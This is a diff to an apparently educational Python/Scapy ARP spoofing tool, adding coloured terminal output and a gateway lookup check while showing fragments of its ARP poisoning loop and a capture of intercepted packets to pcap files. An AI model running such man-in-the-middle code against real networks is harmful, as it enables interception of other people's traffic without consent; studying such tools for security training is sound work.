@@ -18,6 +18,9 @@ import signal
 import sys
 import os
 
+RED_BOLD = '\033[1;31m'
+BLUE_BOLD = '\033[1;34m'
+RESET = '\033[0m'
 
 def get_mac(target_ip):
     packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target_ip)
@@ -45,9 +48,11 @@ class Arper:
         self.target = target
         self.target_mac = get_mac(self.target)
         if self.target_mac is None:
-            sys.exit('Target not found')
+            sys.exit(f'{RED_BOLD}Target not found{RESET}')
         self.gateway = gateway
         self.gateway_mac = get_mac(gateway)
+        if self.gateway_mac is None:
+            sys.exit(f'{RED_BOLD}Gateway not found{RESET}')
         self.count = count
         self.interface = interface
         self.delay = delay
@@ -57,15 +62,14 @@ class Arper:
         conf.iface = interface
         conf.verb = 0
 
-        print(f'Initialised {interface}: ')
-        print(f'Gateway ({gateway}) is at {self.gateway_mac}. ')
-        print(f'Target ({target}) is at {self.target_mac}')
+        print(f'{BLUE_BOLD}Initialised {interface}: {RESET}')
+        print(f'{BLUE_BOLD}Gateway ({gateway}) is at {self.gateway_mac}. {RESET}')
+        print(f'{RED_BOLD}Target ({target}) is at {self.target_mac}{RESET}')
         print('-' * 30)
 
     def run(self):
         with Forward():
             attacker = ActiveAttacker() if self.active else PassiveAttacker()
-            attacker = ActiveAttacker()    # passive strategy temporarily unavailable
             # An Event instance is created if and only if the ActiveAttacker strategy is selected
             if isinstance(attacker, ActiveAttacker):
                 self.poison_event = Event()
@@ -99,7 +103,7 @@ class ActiveAttacker:
         print(f'MAC src: {poison_gateway[Ether].src}')
         print(poison_gateway.summary())
         print('-' * 30)
-        print('Beginning the ARP poison. [CTRL-C to stop]')
+        print(f'Beginning the ARP poison. {RED_BOLD}[CTRL-C to stop]{RESET}')
         while not event.is_set():
             sys.stdout.write('.')
             sys.stdout.flush()
@@ -197,7 +201,7 @@ class PassiveAttacker:
             poison_process.kill()
             poison_process.join()   # Hence, attempts to terminate it elsewhere in the code would be redundant
             wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
-            print(f'Got {len(packets)} packets')
+            print(f'Got {BLUE_BOLD}{len(packets)}{RESET} packets')
 
     def restore(self, arper: Arper):
         '''
@@ -281,7 +285,7 @@ class Forward:
 if __name__ == '__main__':
     '''main execution flow'''
     if os.getuid() != 0:
-        print('Run it as root.')
+        print(f'{RED_BOLD}Run it as root.{RESET}')
         exit(1)
     parser = argparse.ArgumentParser(description='Perform ARP spoofing on the target machine')
     parser.add_argument('target',  help='IPv4 address of target machine')
